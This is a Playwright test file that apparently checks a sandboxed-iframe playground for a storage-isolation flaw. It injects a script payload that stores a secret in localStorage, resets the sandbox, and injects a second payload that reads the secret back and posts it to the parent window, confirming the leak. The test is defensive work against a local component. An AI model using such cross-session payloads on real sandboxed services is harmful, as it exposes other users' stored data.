import { test, expect } from '@playwright/test';

test('Storage Sharing Between Instances', async ({ page }) => {
  // 1. Setup
  await page.goto('http://localhost:3333/playground/security.html');
  await page.waitForFunction(() => window.SandboxControl !== undefined);

  // Enable scripts
  await page.evaluate(() => {
     window.SandboxControl.sandboxElement.setAttribute('script-unsafe', 'true');
  });
  await page.waitForTimeout(2000);

  // 2. Exploit: Write to LocalStorage in Instance A
  const writePayload = `
    localStorage.setItem('SECRET_KEY', 'my-super-secret-123');
    window.top.postMessage({ type: 'PWN_WRITE_DONE' }, '*');
  `;

  await page.evaluate((code) => {
    window.SandboxControl.execute(code);
  }, writePayload);

  // Wait for write
  await page.waitForFunction(() => {
      return new Promise(resolve => {
          window.addEventListener('message', m => {
              if (m.data.type === 'PWN_WRITE_DONE') resolve(true);
          });
      });
  });

  // 3. Reset Sandbox (Simulate new session or another user)
  // The 'reset' method reloads the iframe.
  console.log("Resetting sandbox...");
  await page.evaluate(() => window.SandboxControl.reset());
  await page.waitForTimeout(2000); // Wait for reload

  // 4. Exploit: Read from LocalStorage in Instance B
  const readPayload = `
    const secret = localStorage.getItem('SECRET_KEY');
    window.top.postMessage({ type: 'PWN_READ_RESULT', secret }, '*');
  `;

  await page.evaluate((code) => {
    window.SandboxControl.execute(code);
  }, readPayload);

  // 5. Verify: Secret leaked
  const result = await page.evaluate(() => {
      return new Promise(resolve => {
          window.addEventListener('message', m => {
              if (m.data.type === 'PWN_READ_RESULT') resolve(m.data);
          });
      });
  });

  expect(result.secret).toBe('my-super-secret-123');
  console.log("Exploit Success: Leaked Secret =", result.secret);
});
